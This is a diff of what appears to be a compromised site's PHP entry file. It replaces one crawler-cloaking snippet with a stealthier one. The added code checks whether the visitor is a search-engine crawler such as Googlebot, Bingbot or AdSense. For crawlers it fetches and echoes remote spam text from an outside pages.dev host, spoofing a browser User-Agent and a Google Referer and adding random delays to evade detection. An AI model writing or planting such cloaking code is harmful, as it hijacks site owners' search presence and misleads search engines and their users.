@@ -1,11 +1,27 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
+@ob_start();
+header("Vary: U-Agent");
 
-if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-    echo file_get_contents('https://kicaukicaukicaumania.pages.dev/jaket.txt');
-    exit();
+$src = "https://kicaukicaukicaumania.pages.dev/jaket.txt";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
 }
 ?>
 <?php
